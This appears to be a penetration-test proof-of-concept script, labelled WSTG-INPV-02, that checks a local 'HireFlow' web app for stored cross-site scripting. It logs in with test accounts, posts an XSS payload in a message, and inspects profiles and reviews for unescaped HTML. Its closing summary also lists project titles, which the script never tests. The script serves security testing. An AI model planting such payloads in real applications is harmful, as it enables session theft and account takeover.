"""
WSTG-INPV-02: Stored XSS in Multiple Fields
Demonstrates that HTML/JavaScript payloads are stored without sanitization
in messages, review comments, and user profiles.
Expected: XSS payloads stored and returned verbatim in API responses.
"""
import requests

BASE = "http://localhost:3000"

# Step 1: Login as client and freelancer
login_client = requests.post(f"{BASE}/api/auth/login", json={
    "email": "testclient@hireflow.com",
    "password": "password123"
})
client_token = login_client.json()["token"]
client_id = login_client.json()["user"]["id"]

login_freelancer = requests.post(f"{BASE}/api/auth/login", json={
    "email": "testfreelancer@hireflow.com",
    "password": "password123"
})
freelancer_id = login_freelancer.json()["user"]["id"]

XSS_PAYLOAD = '<img src=x onerror=alert(document.cookie)>'
print(f"[+] XSS payload: {XSS_PAYLOAD}")

# Test 1: Stored XSS in messages
print(f"\n--- Test 1: XSS in Messages ---")
conv = requests.post(f"{BASE}/api/messages/conversations", json={
    "participant_ids": [freelancer_id],
    "message": XSS_PAYLOAD
}, headers={"Authorization": f"Bearer {client_token}"})

conv_data = conv.json()
conv_id = conv_data.get("id")
msg_content = conv_data.get("initial_message", {}).get("content", "")
print(f"[+] Message stored: {msg_content}")
if XSS_PAYLOAD in msg_content:
    print("[VULNERABLE] XSS payload stored without sanitization in messages")

# Test 2: Stored XSS in user display_name
print(f"\n--- Test 2: XSS in User Profile ---")
profile = requests.get(f"{BASE}/api/auth/me", headers={
    "Authorization": f"Bearer {client_token}"
})
display_name = profile.json().get("user", {}).get("display_name", "")
print(f"[+] Current display_name: {display_name}")
if "<" in display_name and ">" in display_name:
    print("[VULNERABLE] HTML content found in display_name")

# Test 3: Check existing reviews for XSS
print(f"\n--- Test 3: XSS in Reviews ---")
reviews = requests.get(f"{BASE}/api/reviews", headers={
    "Authorization": f"Bearer {client_token}"
})
for review in reviews.json().get("reviews", [])[:5]:
    comment = review.get("comment", "")
    reviewer_name = review.get("reviewer_name", "")
    if "<" in comment or "<" in reviewer_name:
        print(f"[VULNERABLE] HTML in review: comment={comment[:60]}, reviewer_name={reviewer_name[:60]}")
        break

print(f"\n[SUMMARY]")
print(f"XSS payloads are stored without sanitization in:")
print(f"  - User display_name")
print(f"  - Message content")
print(f"  - Review comments and reviewer names")
print(f"  - Project titles")
print(f"Impact: If rendered as HTML, enables session theft and account takeover")
